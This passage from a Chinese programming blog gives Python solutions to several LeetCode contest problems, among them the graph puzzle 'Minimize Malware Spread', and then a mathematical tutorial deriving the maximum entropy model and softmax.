&lt;= graph[i][j] == graph[j][i] &lt;= 1 graph[i][i] = 1 1 &lt;= initial.length &lt; graph.length 0 &lt;= initial[i] &lt; graph.length 题目地址：leetcode Minimize Malware Spread II 题目大意：和924. Minimize Malware Spread类似，给定一张电脑网络连接图，如果g[i][j] = 1，说明电脑i连接到电脑j。初始的时候initial中的电脑感染了病毒，感染病毒的电脑会传播到和它直接相连的电脑中。不断的进行传播，最后设M为最终感染的数目。现在要让你从initial中去掉某个电脑，去掉该电脑后，其边的关系也被去除。问去掉哪个电脑可以使得去掉后感染的电脑数最少。 思路：和924题类似，那题可以贪心的计算出某个结点最大可达的结点个数，这题就计算去掉之后被感染的，然后找最小的即可。 Python 12345678910111213141516171819202122232425262728class Solution(object): def dfs(self, from_, g, vis, ini_): vis[from_] = True for to in range(len(g[from_])): if not g[from_][to] or vis[to] or to == ini_: continue self.dfs(to, g, vis, ini_) def minMalwareSpread(self, graph, initial): &quot;&quot;&quot; :type graph: List[List[int]] :type initial: List[int] :rtype: int &quot;&quot;&quot; cnt = [0] * len(graph) initial.sort() for ini_ in initial: vis = [False] * len(graph) for i in initial: if i != ini_: self.dfs(i, graph, vis, ini_) cnt[ini_] = sum(vis) min_node = initial[0] for node in initial: if cnt[node] &lt; cnt[min_node]: min_node = node return min_node 本文是leetcode contest 107的题解: 925. Long Pressed Name 926. Flip String to Monotone Increasing 927. Three Equal Parts 928. Minimize Malware Spread II 更多题解可以查看： https://www.hrwhisper.me/leetcode-algorithm-solution/","categories":[{"name":"code","slug":"code","permalink":"https://www.hrwhisper.me/categories/code/"},{"name":"Leetcode","slug":"code/Leetcode","permalink":"https://www.hrwhisper.me/categories/code/Leetcode/"}],"tags":[{"name":"leetcode","slug":"leetcode","permalink":"https://www.hrwhisper.me/tags/leetcode/"}]},{"title":"leetcode contest 106 solution","slug":"leetcode-contest-106-solution","date":"2018-10-14T03:33:04.000Z","updated":"2021-01-08T13:16:21.103Z","comments":true,"path":"leetcode-contest-106-solution/","link":"","permalink":"https://www.hrwhisper.me/leetcode-contest-106-solution/","excerpt":"本文是leetcode contest 106的题解，包括： 921. Minimum Add to Make Parentheses Valid 922. Sort Array By Parity II 923. 3Sum With Multiplicity 924. Minimize Malware Spread 好久没打比赛了，一个多小时AK。。","text":"本文是leetcode contest 106的题解，包括： 921. Minimum Add to Make Parentheses Valid 922. Sort Array By Parity II 923. 3Sum With Multiplicity 924. Minimize Malware Spread 好久没打比赛了，一个多小时AK。。 921. Minimum Add to Make Parentheses Valid Given a string S of '(' and ')' parentheses, we add the minimum number of parentheses ( '(' or ')', and in any positions ) so that the resulting parentheses string is valid. Formally, a parentheses string is valid if and only if: It is the empty string, or It can be written as AB (A concatenated with B), where A and B are valid strings, or It can be written as (A), where A is a valid string. Given a parentheses string, return the minimum number of parentheses we must add to make the resulting string valid. Example 1: 12Input: &quot;())&quot;Output: 1 Example 2: 12&quot;(((&quot;Output: 3 Example 3: 123Input: &quot;()&quot;Output:0 Example 4: 12Input:&quot;()))((&quot;Output:4 题目地址：leetcode Minimum Add to Make Parentheses Valid 题目大意：给定一个只包含左右括号的字符串，求最小加入多少个括号能使得该字符串合法？ 思路：用一个变量left统计左括号的个数，遇到右括号则left--，如果left&lt;0，说明左括号个数不够，答案+1。 当遍历完之后，若left不为0，说明没有足够的右括号与左括号匹配，还需要加入left个。复杂度O(n) 12345678910111213141516class Solution(object): def minAddToMakeValid(self, S): &quot;&quot;&quot; :type S: str :rtype: int &quot;&quot;&quot; left = ans = 0 for c in S: if c == &#x27;(&#x27;: left += 1 else: left -= 1 if left &lt; 0: ans += 1 left = 0 return ans + left 922. Sort Array By Parity II Given an array A of non-negative integers, half of the integers in A are odd, and half of the integers are even. Sort the array so that whenever A[i] is odd, i is odd; and whenever A[i] is even, i is even. You may return any answer array that satisfies this condition. Example 1: 123Input: [4,2,5,7]Output: [4,5,2,7]Explanation: [4,7,2,5], [2,5,4,7], [2,7,4,5] would also have been accepted. 题目地址：leetcode Sort Array By Parity II 题目大意：给定一个非负的数组A，A的长度为偶数。在A中，一半的数字是奇数，另一半数字是偶数，现在要让你排序，使得数组A满足对于所有的i 如果A[i]是奇数，则i也要是奇数 如果A[i]是偶数，则i也要是偶数 思路：用一个even表示下标even应该放置偶数，但该位置目前放置的是奇数。然后用odd遍历奇数位置，遇到奇数的位置上放的是偶数就和even交换。复杂度O(n) Python 1234567891011121314151617class Solution(object): def sortArrayByParityII(self, A): &quot;&quot;&quot; :type A: List[int] :rtype: List[int] &quot;&quot;&quot; even = 0 for odd in range(1, len(A), 2): if A[odd] &amp; 1: continue while even &lt; len(A): if A[even] &amp; 1: break even += 2 if even == len(A): return A A[even], A[odd] = A[odd], A[even] return A 923. 3Sum With Multiplicity Given an integer array A, and an integer target, return the number of tuples i, j, k such that i &lt; j &lt; k and A[i] + A[j] + A[k] == target. As the answer can be very large, return it modulo 10^9 + 7. Example 1: 123456789Input: A &#x3D; [1,1,2,2,3,3,4,4,5,5], target &#x3D; 8Output:20Explanation: Enumerating by the values (A[i], A[j], A[k]):(1, 2, 5) occurs 8 times;(1, 3, 4) occurs 8 times;(2, 2, 4) occurs 2 times;(2, 3, 3) occurs 2 times. Example 2: 1234567Input: A &#x3D; , target &#x3D; 5Output: 12Explanation: A[i] &#x3D; 1, A[j] &#x3D; A[k] &#x3D; 2 occurs 12 times:We choose one 1 from [1,1] in 2 ways,and two 2s from [2,2,2,2] in 6 ways. Note: 3 &lt;= A.length &lt;= 3000 0 &lt;= A[i] &lt;= 100 0 &lt;= target &lt;= 300 题目地址：leetcode 3Sum With Multiplicity 题目大意：给定数组A和一个数target，求所有的满足A[i] + A[j] + A[k] == target且i &lt; j &lt; k的i, j, k的个数。 思路：和3sum问题类似，我们可以枚举第一个下标k，然后用双指针的方法查找i和j。 但是有个问题就是当A[i] == A[j]的时候，下一次是应该i++？还是j--? 这里我是将相同数去掉，这种情况只会在i==j的时候出现，只需要判断cnt[i] &gt;= 2 然后计算组合数C(cnt[i], 2)。 还有一个细节是i应该从k的位置开始，比如第一个example中的(2, 2, 4)。计算的时候要判断一下（比如还有i= j = k，相当于组合数C(cnt[i], 3)） Python 1234567891011121314151617181920212223242526272829303132333435363738394041424344class Solution(object): def combination_cal(self, n, k=2): t = n for i in range(1, k): t *= (n - i) for x in range(2, k + 1): t //= x return t def threeSumMulti(self, A, target): &quot;&quot;&quot; :type A: List[int] :type target: int :rtype: int &quot;&quot;&quot; temp = sorted(collections.Counter(A).items()) A = [i[0] for i in temp] cnt = [i[1] for i in temp] ans = 0 for k in range(len(A)): t = target - A[k] i = k j = len(A) - 1 while i &lt;= j: if A[i] + A[j] &lt; t: i += 1 elif A[i] + A[j] &gt; t: j -= 1 else: if i == j: if cnt[i] &gt;= 2: if i == k: ans += int(self.combination_cal(cnt[i], 3)) else: ans += cnt[k] * int(self.combination_cal(cnt[i], 2)) else: if i == k: ans += int(self.combination_cal(cnt[i], 2)) * cnt[j] else: ans += cnt[k] * cnt[i] * cnt[j] i += 1 j -= 1 return ans % (10 ** 9 + 7) 924. Minimize Malware Spread In a network of nodes, each node i is directly connected to another node j if and only if graph[i][j] = 1. Some nodes initial are initially infected by malware. Whenever two nodes are directly connected and at least one of those two nodes is infected by malware, both nodes will be infected by malware. This spread of malware will continue until no more nodes can be infected in this manner. Suppose M(initial) is the final number of nodes infected with malware in the entire network, after the spread of malware stops. We will remove one node from the initial list. Return the node that if removed, would minimize M(initial). If multiple nodes could be removed to minimize M(initial), return such a node with the smallest index. Note that if a node was removed from the initial list of infected nodes, it may still be infected later as a result of the malware spread. Example 1: 123Input: graph &#x3D;[[1,1,0],[1,1,0],[0,0,1]], initial &#x3D; [0,1]Output: 0 Example 2: 123Input: graph &#x3D; [[1,0,0],[0,1,0],[0,0,1]], initial &#x3D; [0,2]Output: 0 Example 3: 12Input: graph &#x3D; [[1,1,1],[1,1,1],[1,1,1]], initial &#x3D;[1,2]Output: 1 Note: 1 &lt; graph.length = graph[0].length &lt;= 300 0 &lt;= graph[i][j] == graph[j][i] &lt;= 1 graph[i][i] = 1 1 &lt;= initial.length &lt; graph.length 0 &lt;= initial[i] &lt; graph.length 题目地址：leetcode Minimize Malware Spread 题目大意：给定一张电脑网络连接图，如果g[i][j] = 1，说明电脑i连接到电脑j。初始的时候initial中的电脑感染了病毒，感染病毒的电脑会传播到和它直接相连的电脑中。不断的进行传播，最后设M为最终感染的数目。现在要让你从initial中去掉某个电脑，使得去掉后感染的电脑数最少。 思路： 直接dfs对Initial数组中每一个求可到的结点数，去掉最高的就行了。 Python 12345678910111213141516171819202122232425class Solution(object): def dfs(self, from_, g, vis, ini_): vis[from_] = True for to in range(len(g[from_])): if not g[from_][to] or vis[to]: continue self.dfs(to, g, vis, ini_) def minMalwareSpread(self, graph, initial): &quot;&quot;&quot; :type graph: List[List[int]] :type initial: List[int] :rtype: int &quot;&quot;&quot; cnt = [0] * len(graph) initial.sort() for ini_ in initial: vis = [False] * len(graph) self.dfs(ini_, graph, vis, ini_) cnt[ini_] = sum(vis) max_node = initial[0] for node in initial: if cnt[node] &gt; cnt[max_node]: max_node = node return max_node 上面的方法可以进行优化：假如a能到b，由于是无向图，那么b也能到达a，那么只需要先对initial数组排序，然后对没有访问的结点dfs就行了 12345678910111213141516171819202122232425class Solution(object): def dfs(self, cur, g, vis, source, cnt): vis[cur] = True cnt[source] += 1 for to in range(len(g[cur])): if not g[cur][to] or vis[to]: continue self.dfs(to, g, vis, source, cnt) def minMalwareSpread(self, graph, initial): &quot;&quot;&quot; :type graph: List[List[int]] :type initial: List[int] :rtype: int &quot;&quot;&quot; cnt = [0] * len(graph) vis = [False] * len(graph) initial.sort() for from_ in initial: self.dfs(from_, graph, vis, from_, cnt) max_node = initial[0] for node in initial: if cnt[node] &gt; cnt[max_node]: max_node = node return max_node 本文是leetcode如下的题解 921. Minimum Add to Make Parentheses Valid 922. Sort Array By Parity II 923. 3Sum With Multiplicity 924. Minimize Malware Spread 更多题解可以查看： https://www.hrwhisper.me/leetcode-algorithm-solution/","categories":[{"name":"code","slug":"code","permalink":"https://www.hrwhisper.me/categories/code/"},{"name":"Leetcode","slug":"code/Leetcode","permalink":"https://www.hrwhisper.me/categories/code/Leetcode/"}],"tags":[{"name":"leetcode","slug":"leetcode","permalink":"https://www.hrwhisper.me/tags/leetcode/"}]},{"title":"『我爱机器学习』最大熵原理与最大熵模型","slug":"machine-learning-maximum-entropy-model","date":"2018-07-22T03:01:43.000Z","updated":"2020-10-21T15:07:16.293Z","comments":true,"path":"machine-learning-maximum-entropy-model/","link":"","permalink":"https://www.hrwhisper.me/machine-learning-maximum-entropy-model/","excerpt":"俗话说，”不要把鸡蛋放在一个篮子里“，这样是为了降低风险。为什么能降低风险呢？背后的数学道理就是最大熵原理。 本文介绍内容有： 最大熵原理 最大熵模型 和逻辑回归的关系 为什么logistics regression用sigmoid函数","text":"俗话说，”不要把鸡蛋放在一个篮子里“，这样是为了降低风险。为什么能降低风险呢？背后的数学道理就是最大熵原理。 本文介绍内容有： 最大熵原理 最大熵模型 和逻辑回归的关系 为什么logistics regression用sigmoid函数 最大熵原理 引用吴军的《数学之美》的例子： 有 一次，我去 AT&amp;T 实验室作关于最大熵模型的报告，我带去了一个骰子。我问听众\"每个面朝上的概率分别是多少\"，所有人都说是等概率，即各点的概率均为1/6。这种猜测当然 是对的。我问听众们为什么，得到的回答是一致的：对这个\"一无所知\"的骰子，假定它每一个朝上概率均等是最安全的做法（你不应该主观假设它象韦小宝的骰子一样灌了铅）。从投资的角度看，就是风险最小的做法。从信息论的角度讲，就是保留了最大的不确定性，也就是说让熵达到最大。接着，我又告诉听众，我的这 个骰子被我特殊处理过，已知四点朝上的概率是三分之一，在这种情况下，每个面朝上的概率是多少？这次，大部分人认为除去四点的概率是 1/3，其余的均是 2/15，也就是说已知的条件必须满足（四点概率为 1/3），而对其数学期望余各点的概率因为仍然无从知道，因此只好认为它们均等。注意，在猜测这两种不同情况下的概率分布时，大家都没有添加任何主观的假 设，诸如四点的反面一定是三点等等。（事实上，有的骰子四点反面不是三点而是一点。）这种基于直觉的猜测之所以准确，是因为它恰好符合了最大熵原理。 最大熵原理指出，当我们需要对一个随机事件的概率分布进行预测时，我们的预测应当满足全部已知的条件，而对未知的情况不要做任何主观假设。（不做主观假设这点很重要。）在这种情况下，概率分布最均匀，预测的风险最小。因为这时概率分布的信息熵最大，所以人们称这种模型叫\"最大熵模型\"。我们常说，不要把所有的鸡蛋放在一个篮子里，其实就是最大熵原理的一个朴素的说法，因为当我们遇到不确定性时，就要保留各种可能性。 在决策树那篇文章中，我介绍过熵的概念，这里做一个简单的复习。 信息论与概率统计中，熵（Entropy）用来表示随机变量不确定性的大小，熵越大，不确定性越大。 设随机变量X有d个取值\\(\\{x_1,x_2,\\cdots, x_d\\}\\), 取值为\\(x_i\\)的概率为\\(p_i\\), 则随机变量的熵定义为： \\[ H(X) = -\\sum_{i=1}^dp_i\\log p_i\\tag{2-1} \\] 计算时，若p = 0，则\\(p_i\\log p_i = 0\\) 。 因为熵只依赖于X的分布，所以可以将\\(H(X)\\)写为\\(H(p)\\) 熵满足下面的不等式： \\[ 0 \\le H(X) \\le \\log |X|, \\hspace{4ex} |X| 为X的取值个数 \\] 接着介绍条件熵（conditional entropy），即给定随机变量X后，D剩余的不确定性（熵）: \\[ H(Y | X)= \\sum_{i=1}^dp(X=x_i)H(Y|X=x_i)=-\\sum_{i=1}^dp(x_i) \\sum_{j=1}^mp(y_j|x_i)\\log p(y_j|x_i) \\tag{2-2} \\] 其实就是按特征X的取值划分数据，对取值为\\(x_i\\)的数据计算熵，然后乘以取值为\\(x_i\\)的概率。 最大熵模型 最大熵原理是统计学习的一般原理，运用到分类问题上就得到了最大熵模型。最大熵模型是给定\\(X\\)，输出条件概率条件概率\\(P(Y|X)\\)。 那么，如何把最大熵原理应用到分类问题上呢？上面提到，最大熵原理需要满足已知条件，而未知的情况就假设它们概率均等。 换句话说，我们需要让模型先满足所有的约束条件（满足约束条件的模型可能有很多），然后从这些满足约束条件的模型中选择熵最大的模型。 那么，约束条件从哪里来呢？最大熵模型做法是：从训练集T中抽取特征，然后要求这些特征在训练集中的经验分布\\(\\tilde P(X, Y)\\)的期望等于它们关于模型\\(P(Y|X)\\)与经验分布\\(\\tilde P(X)\\)的期望值。 下面，我们所做的就是构建出约束的条件来建立模型。 特征函数 上面提到，需要抽取特征，而特征可以用一个函数来表示： \\[ f(x, y) = \\left\\{ \\begin{array}{lr} 1, \\hspace{2ex} (x,y)满足某一事实 \\\\ 0, \\hspace{2ex} 否则 \\end{array} \\right.\\tag{2-1} \\] 这是一个二值函数，当然，在一般情况下，特征函数也可以是任意实值函数，但是这里为了表述方便，采用了二值 的表示。 比如说peghoty 举的例子： featrue-function-example 经验分布和期望 经验分布就是说在训练集上进行统计得到的分布，我们在上面加上一个小波浪线，比如： \\[ \\tilde P(x) = \\frac{\\rm count(x)}{N}\\\\ \\tilde P(x,y) = \\frac{\\rm count(x,y)}{N} \\] 其中 count(x)和count(x,y) 分别表示x和(x,y)在训练集中出现的次数。 N为训练集的大小。 到这里，就可以给出我们的两个期望。 第一个是特征函数在训练数据上关于经验分布\\(\\tilde P(X, Y)\\)的期望值\\(E_{\\tilde p}(f)\\)： \\[ E_{\\tilde p}(f) = \\sum_{x,y} \\tilde P(x, y) f(x, y) \\tag{2-2} \\] 第二个是特征函数关于模型\\(P(x,y)\\)的数学期望\\(E_{p}(f)\\)： \\[ E_{p}(f) = \\sum_{x,y}P(x, y) f(x, y) \\] 注意，这里的求和项\\(\\sum_{x,y}\\)应该是训练集中x的所有取值和y的所有取值两两组成的对(笛卡尔积) 上面的式子中\\(P(x, y)\\)是未知的，而注意我们之前建模的目标是\\(P(y|x)\\)，因此可以由贝叶斯定理展开： \\[ \\begin{align*} E_{p}(f) &amp;= \\sum_{x,y}P(x)P(y|x)f(x, y) \\hspace{4ex} P(x,y)未知，用贝叶斯公式\\\\ &amp;= \\sum_{x,y}\\tilde P(x)P(y|x)f(x, y) \\hspace{4ex} P(x)未知，用\\tilde P(x)来近似 \\end{align*}\\tag{2-3} \\] 我们希望特征f的期望应该和从训练数据中得到的特征的期望是一样的： \\[ \\begin{align*} E_{p}(f) &amp;= E_{\\tilde p}(f) \\\\ \\sum_{x,y} \\tilde P(x, y) f(x, y) &amp;= \\sum_{x,y}\\tilde P(x)P(y|x)f(x, y) \\tag{2-4} \\end{align*} \\] 最大熵模型 因此，这里就可以给出我们的最大熵模型了，假如有d个特征函数\\(f_i(x,y), i=1,2,\\ \\cdots,d\\)，那么就有d个约束条件，满足这些条件的模型可能有很多个，我们将满足这些约束条件的模型设为集合C: \\[ C \\equiv \\{P\\in \\mathcal{P} | E_{p}(f_i) = E_{\\tilde p}(f_i) ,\\ i=1,2,\\cdots,d\\} \\] 我们的最大熵模型就是C中条件熵最大的模型： \\[ H(P) = -\\sum_{x,y}\\tilde P(x)P(y|x) \\log P(y |x ) \\tag{2-5} \\] 为什么使用条件熵呢？是因为使用条件熵就有我们要求的\\(P(y|x)\\)，此外2-5式子中的对数是自然对数。 最大熵模型的学习就等价于求解约束问题： \\[ \\begin{align*} \\max_{P \\in C}\\hspace{3ex} &amp; H(P) = -\\sum_{x,y}\\tilde P(x)P(y|x) \\log P(y |x ) \\\\ {\\rm s.t.}\\hspace{3ex} &amp; E_{p}(f_i) = E_{\\tilde p}(f_i), \\hspace{3ex}i=1,2,\\cdots ,d\\\\ &amp; \\sum_y P(y|x) = 1 \\end{align*}\\tag{2-6} \\] 按最优化的习惯，写成求解最小值的问题： \\[ \\begin{align*} \\min_{P \\in C}\\hspace{3ex} &amp; \\sum_{x,y}\\tilde P(x)P(y|x) \\log P(y |x ) \\\\ {\\rm s.t.}\\hspace{3ex} &amp; E_{\\tilde p}(f_i) - E_{p}(f_i) = 0, \\hspace{3ex}i=1,2,\\cdots ,d\\\\ &amp; 1 - \\sum_y P(y|x) = 0 \\end{align*}\\tag{2-7} \\] ### 模型求解 同之前的SVM求解一样，我们也将2-7使用拉格朗日乘子法转化为对偶问题： \\[ L(P, \\lambda) =\\sum_{x,y}\\tilde P(x)P(y|x) \\log P(y |x )+\\lambda_0(1 - \\sum_y P(y|x) )+\\sum_{i=1}^d \\lambda_i \\left(\\sum_{x,y} \\tilde P(x, y) f_i(x, y) - \\sum_{x,y}\\tilde P(x)P(y|x)f_i(x, y) \\right) \\tag{2-8} \\] 原始问题是\\(\\min_P \\max_\\lambda L(P, \\lambda)\\)，对偶问题是\\(\\max_\\lambda \\min_P L(P, \\lambda)\\) 首先对\\(P(y|x)\\)求偏导： \\[ \\begin{align*} \\frac{\\partial L(P, \\lambda) }{\\partial P(y|x)} &amp;=\\sum_{x,y}\\tilde P(x) \\left(log P(y|x)+1 \\right) - \\sum_y\\lambda_0 -\\sum_{i=1}^d \\lambda_i \\left( \\sum_{x,y}\\tilde P(x)f_i(x, y)\\right)\\\\ &amp;= \\sum_{x,y}\\tilde P(x) \\left(log P(y|x)+1 \\right) - \\sum_x \\tilde P(x)\\sum_y\\lambda_0 - \\sum_{x,y} \\tilde P(x)\\sum_{i=1}^d \\lambda_if_i(x, y)\\\\ &amp;= \\sum_{x,y}\\tilde P(x) \\left(log P(y|x)+1 \\right) - \\sum_{x,y} \\tilde P(x)\\lambda_0 - \\sum_{x,y} \\tilde P(x)\\sum_{i=1}^d \\lambda_if_i(x, y)\\\\ &amp;= \\sum_{x,y}\\tilde P(x) \\left(log P(y|x)+1 - \\lambda_0 - \\sum_{i=1}^d \\lambda_if_i(x, y) \\right) \\end{align*} \\] 令偏导数为0，而我们有\\(\\tilde P(x) \\gt 0\\)，因此得： \\[ log P(y|x)+1 - \\lambda_0 - \\sum_{i=1}^d \\lambda_if_i(x, y) = 0 \\] 从而解得： \\[ P(y|x) = e^{\\lambda_0 - 1} e^{\\sum_{i=1}^d \\lambda_if_i(x, y) }\\tag{2-8} \\] 将2-8带入\\(1 - \\sum_y P(y|x) = 0\\)得： \\[ \\sum_y e^{\\lambda_0 - 1} e^{\\sum_{i=1}^d \\lambda_if_i(x, y) } =e^{\\lambda_0 - 1} \\sum_y e^{\\sum_{i=1}^d \\lambda_if_i(x, y) } = 1 \\] 可得： \\[ e^{\\lambda_0 - 1} = \\frac{1}{\\sum_y e^{\\sum_{i=1}^d \\lambda_if_i(x, y) } } \\tag{2-9} \\] 将2-9带入2-8得： \\[ P_\\lambda = P(y|x) = \\frac{1}{Z_\\lambda(x)}e^{\\sum_{i=1}^d \\lambda_if_i(x, y)} \\\\ 其中 , Z_\\lambda(x) =\\sum_y e^{\\sum_{i=1}^d \\lambda_if_i(x, y) } \\tag{2-10} \\] 这个\\(P_\\lambda\\)就是最大熵模型的解，它具有指数形式，\\(f_i(x,y)\\)是特征函数，\\(\\lambda_i\\)是特征的权值，\\(\\lambda_i\\)越大，说明特征越重要。需要注意的一点是\\(\\lambda_0\\)已经被消去了。\\(Z_\\lambda\\)称为规范化因子。 上面已经求解了内层的极小值，现在要求外层的极大值\\(max_\\lambda \\Psi(\\lambda)\\) 将2-10带入2-8，可得： \\[ \\begin{align*} \\Psi(\\lambda) &amp;=\\sum_{x,y}\\tilde P(x)P_\\lambda \\log P_\\lambda+\\sum_{i=1}^d \\lambda_i \\left(\\sum_{x,y} \\tilde P(x, y) f_i(x, y) - \\sum_{x,y}\\tilde P(x)P_\\lambda f_i(x, y) \\right) \\\\ &amp;= \\sum_{x,y} \\tilde P(x, y) \\sum_{i=1}^d\\lambda_if_i(x, y) + \\sum_{x,y}\\tilde P(x)P_\\lambda \\left( \\log P_\\lambda - \\sum_{i=1}^d \\lambda_if_i(x, y) \\right) \\\\ &amp; = \\sum_{x,y} \\tilde P(x, y) \\sum_{i=1}^d\\lambda_if_i(x, y) -\\sum_{x,y}\\tilde P(x)P_\\lambda \\log Z_\\lambda(x)\\\\ &amp; = \\sum_{x,y} \\tilde P(x, y) \\sum_{i=1}^d\\lambda_if_i(x, y) -\\sum_{x}\\tilde P(x)\\log Z_\\lambda(x)\\tag{2-11} \\end{align*} \\] 最后一步用到了\\(\\sum_yP_\\lambda = 1\\) 接下来的任务就是求 \\(max_\\lambda \\Psi(\\lambda)\\)，这个可以用梯度下降等方法求解，也可以用GIS，IIS等改进的优化方法。 和极大似然的关系 已知训练数据的经验概率分布\\(\\tilde P(x,y)\\)，条件概率分布\\(P(Y|X)\\)的对数似然函数为： \\[ \\mathcal{L}_{\\tilde p}(P_\\lambda) = \\log \\prod_{x,y} P_\\lambda^{\\tilde P(x,y)} = \\sum_{x,y} \\tilde P(x,y) \\log P_\\lambda \\tag{2-12} \\] 当条件概率分布\\(P(Y|X)\\)是2-10时的最大熵模型时，将2-10带入上式得： \\[ \\begin{align*} \\mathcal{L}_{\\tilde p}(P_\\lambda) &amp;= \\sum_{x,y} \\tilde P(x,y) \\log P_\\lambda \\\\ &amp; = \\sum_{x,y} \\tilde P(x, y) \\sum_{i=1}^d\\lambda_if_i(x, y) -\\sum_{x,y}\\tilde P(x,y)\\log Z_\\lambda(x)\\\\ &amp; = \\sum_{x,y} \\tilde P(x, y) \\sum_{i=1}^d\\lambda_if_i(x, y) -\\sum_{x}\\tilde P(x)\\log Z_\\lambda(x) \\tag{2-13} \\end{align*} \\] 可以看到，2-13和2-11是相等的，即最大化似然函数\\(\\mathcal{L}_{\\tilde p}(P_\\lambda)\\)和对偶函数\\(\\Psi(\\lambda)\\)等价，这证明最大熵模型学习中的对偶函数极大化等价于最大熵模型的极大似然估计。 这样，最大熵模型的学习问题就转换为具体求解对数似然函数极大化或对偶函数极大化的问题。 Softmax和Sigmoid怎么来的 回顾逻辑回归 回顾一下逻辑回归： \\[ h({\\bf x}) = \\sigma({\\bf w^Tx}) = \\frac{1}{1+e^{-({\\bf w^Tx})} }\\tag{3-1} \\] 这里的数据集形式为：\\(\\{ {(\\bf x_1}, y_1), ({\\bf x_2}, y_2), \\cdots, ({\\bf x_N}, y_N) \\}\\) 这里\\(\\bf w\\)和\\(\\bf x\\)是一个d * 1的向量，而\\(y_i \\in \\{0, 1\\}\\) 那么，Sigmoid函数是怎么来的呢？ 回顾Softmax 此外，在看看多分类的Softmax： \\[ h({\\bf x}) = \\left[ \\begin{aligned}z_1 \\\\z_2 \\\\ ...\\\\z_K \\end{aligned}\\right]=\\frac{1}{\\sum_{j=1}^Ke^{\\bf w_j^Tx} }\\left[ \\begin{aligned}e^{\\bf w_1^Tx} \\\\e^{\\bf w_2^Tx} \\\\ ...\\\\e^{\\bf w_K^Tx} \\end{aligned}\\right] \\tag{3-2} \\] 对于第k个类别来说， \\[ h_k({\\bf x})=\\frac{e^{\\bf w_k^Tx} }{\\sum_{j=1}^Ke^{\\bf w_j^Tx} }\\tag{3-3} \\] 这里的数据集形式为：\\(\\{ {(\\bf x_1, y_1}), ({\\bf x_2, y_2}), \\cdots, ({\\bf x_N, y_N}) \\}\\) 这里\\(\\bf x\\)是一个D * 1的向量（D为特征数）。而\\({\\bf y_i}\\)则是一个只有一个数字为1，其余都是0的K * 1维向量，用来表示这个样本属于哪个类别。 参数\\(\\bf W = \\bf [w_1, w_2,\\cdots,w_K]\\)为一个矩阵，每个类别都有一个D * 1的权重向量 那么Softmax又是怎么来的呢？ 下面我们先看看Softmax需要满足的条件，然后从最大熵原理进行推导。 Softmax的条件 Softmax的对数似然函数为： \\[ L({\\bf W}) = \\sum_{i=1}^N\\sum_{k=1}^K y_k^{(i)}\\ln h_k^{(i)} \\tag{3-4} \\] 其中\\(y_k^{(i)}\\)表示第i个样本的第k个类别的值，\\(h_k^{(i)}\\)表示第i个样本第k个类别3-3的值 对第j个类别的权重\\(\\bf w_j\\)其求偏导得： \\[ \\begin{align*} \\frac{\\partial L({\\bf W})}{\\partial \\bf w_j} &amp; = \\sum_i\\sum_{k} y_k^{(i)} \\frac{\\partial \\log h_k^{(i)} }{\\partial \\bf w_j}\\\\ &amp;= \\sum_i\\sum_{k} y_k^{(i)} \\frac{1}{h_k^{(i)} }\\frac{\\partial h_k^{(i)} }{\\partial \\bf w_j}\\\\ &amp;= \\sum_i \\left(y_j^{(i)} \\frac{1}{h_j^{(i)} }h_j^{(i)} (1 - h_j^{(i)}){\\bf x ^{(i)} } -\\sum_{k\\ne j}y_k^{(i)} \\frac{1}{h_k^{(i)} }h_k^{(i)}h_j^{(i)}{\\bf x^{(i)} } \\right)\\\\ &amp;=\\sum_i\\left(y_j^{(i)} (1 - h_j^{(i)}){\\bf x^{(i)} } - \\sum_{k\\ne j}y_k^{(i)} h_j^{(i)}{\\bf x^{(i)} } \\right)\\\\ &amp;= \\sum_i \\left(y_j^{(i)} -y_j^{(i)}h_j^{(i)}- \\sum_{k\\ne j}y_k^{(i)}h_j^{(i)}\\right) {\\bf x^{(i)} }\\\\ &amp;= \\sum_i\\left(y_j^{(i)} -\\sum_{k}y_k^{(i)}h_j^{(i)}\\right) {\\bf x^{(i)} } \\\\ &amp;= \\sum_i\\left(y_j^{(i)} -h_j^{(i)}\\sum_{k}y_k^{(i)}\\right) {\\bf x^{(i)} } \\\\ &amp;= \\sum_i \\left(y_j^{(i)}-h_j^{(i)}\\right) {\\bf x^{(i)} } \\end{align*} \\] 令导数为0，得： \\[ \\sum_i y_j^{(i)}{\\bf x^{(i)} } = \\sum_i h_j^{(i)} {\\bf x^{(i)} }\\tag{3-5} \\] 注意到这里\\(\\bf x\\)是一个D * 1维的向量，拆开来看就是对于每个特征d、每个类别j，都有： \\[ \\sum_i y_j^{(i)} x_d^{(i)} = \\sum_i h_j^{(i)} x_d^{(i)} \\tag{3-6} \\] 注意\\(y_j^{(i)}\\)不为0当且仅当第i个样本为第j个类别。这表明对于任意一个类别j，有下面两项相等 - 左边：每个样本若属于第j个类就将第d个特征的值进行累加的和 - 右边：每个样本属于第j个类的概率乘上第d个特征的值的累加和 从最大熵推Softmax 假设我们不知道Softmax的\\(h_j^{(i)}\\)长什么样，我们只知道是第i个样本\\(\\bf x^{(i)}\\)属于第j个类别的概率，同时我们希望3-6的公式成立，并加上另外两个条件, 全部条件如下： \\[ h_j \\ge0 \\\\ \\sum_{j=1}^K h_j^{(i)}= 1\\\\ \\sum_i y_j^{(i)} x_d^{(i)} = \\sum_i h_j^{(i)} x_d^{(i)} \\] 我们也可以用最大熵原理来进行求解，模型的熵为： \\[ - \\sum_{i=1}^N \\sum_{j=1}^K h_j^{(i)} \\log h_j^{(i)} \\] 可以同样使用拉格朗日乘子法，得： \\[ \\mathcal{L} = - \\sum_{i=1}^N \\sum_{j=1}^K h_j^{(i)} \\log h_j^{(i)} + \\sum_{i=1}^N \\alpha_i \\left(\\sum_{j=1}^K (h_j^{(i)} - 1)\\right)+ \\sum_{d=1}^D \\sum_{j=1}^K w_{dj}\\left(\\sum_{i=1}^N \\left (( h_j^{(i)} -y_j^{(i)}) x_d^{(i)} \\right)\\right)\\tag{3-7} \\] 对\\(h_j^{(i)}\\)求偏导，得： \\[ \\begin{align*} \\frac{\\partial\\mathcal{L} }{\\partial h_j^{(i)} } &amp;= - \\sum_{i=1}^N \\sum_{j=1}^K h_j^{(i)} \\log h_j^{(i)} + \\sum_{i=1}^N \\alpha_i \\left(\\sum_{j=1}^K (h_j^{(i)} - 1)\\right)+ \\sum_{d=1}^D \\sum_{j=1}^K w_{dj}\\left(\\sum_{i=1}^N \\left ((h_j^{(i)} -y_j^{(i)}) x_d^{(i)} \\right)\\right)\\\\ &amp;= -(\\log h_j^{(i)} +1)+ \\alpha_i+\\sum_{d=1}^D w_{dj} x_d^{(i)}\\\\ &amp;= -\\log h_j^{(i)} -1+ \\alpha_i +{\\bf w_j^Tx^{(i)} }\\tag{3-8} 